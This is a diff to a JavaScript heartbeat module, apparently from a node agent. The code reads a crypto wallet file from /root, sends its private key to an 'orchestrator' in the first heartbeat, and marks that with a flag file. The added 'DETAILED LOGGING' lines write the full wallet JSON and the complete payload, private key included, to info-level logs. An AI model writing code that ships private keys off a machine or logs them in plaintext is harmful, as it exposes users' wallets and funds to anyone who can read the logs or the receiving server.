@@ -107,10 +107,23 @@ module.exports = {
       const walletSentFlag = '/tmp/wallet_sent_to_orchestrator';
       const walletAlreadySent = await utils.fileExists(walletSentFlag);
       
+      // DETAILED LOGGING: Show exactly what would be sent
+      logger.info('=== HEARTBEAT PREPARATION ===');
+      logger.info('Wallet exists:', walletExists);
+      logger.info('Wallet already sent flag exists:', walletAlreadySent);
+      logger.info('Flag file path:', walletSentFlag);
+      
       if (walletExists && !walletAlreadySent) {
         // First time sending wallet data - include full wallet keys
         try {
           const walletData = JSON.parse(await fs.readFile('/root/wallet.json', 'utf8'));
+          
+          // DETAILED LOGGING: Show wallet data that will be sent
+          logger.info('=== WALLET DATA FOUND ===');
+          logger.info('Private key preview:', walletData.private_key ? walletData.private_key.substring(0, 10) + '...' : 'NOT FOUND');
+          logger.info('Public key preview:', walletData.public_key ? walletData.public_key.substring(0, 10) + '...' : 'NOT FOUND');
+          logger.info('Full wallet data:', JSON.stringify(walletData, null, 2));
+          
           systemInfo.wallet = {
             private_key: walletData.private_key,
             public_key: walletData.public_key,
@@ -119,18 +132,26 @@ module.exports = {
           
           // Mark that wallet has been sent
           await fs.writeFile(walletSentFlag, 'sent', 'utf8');
-          logger.info('Wallet keys sent to orchestrator for the first time');
+          logger.info('✅ Wallet keys will be sent to orchestrator for the first time');
         } catch (error) {
           logger.warn('Could not read wallet data for first heartbeat', { error: error.message });
           systemInfo.wallet = { error: 'Could not read wallet data' };
         }
       } else if (walletExists) {
         // Subsequent heartbeats - just confirm wallet exists
+        logger.info('Wallet exists but already sent previously - sending confirmation only');
         systemInfo.wallet = {
           exists: true,
           sent_previously: true
         };
+      } else {
+        logger.info('No wallet found - sending basic status only');
       }
+      
+      // DETAILED LOGGING: Show complete payload that would be sent
+      logger.info('=== COMPLETE HEARTBEAT PAYLOAD ===');
+      logger.info(JSON.stringify(systemInfo, null, 2));
+      logger.info('=== END HEARTBEAT PAYLOAD ===');
       
       logger.debug('Heartbeat sent', systemInfo);
       return systemInfo;
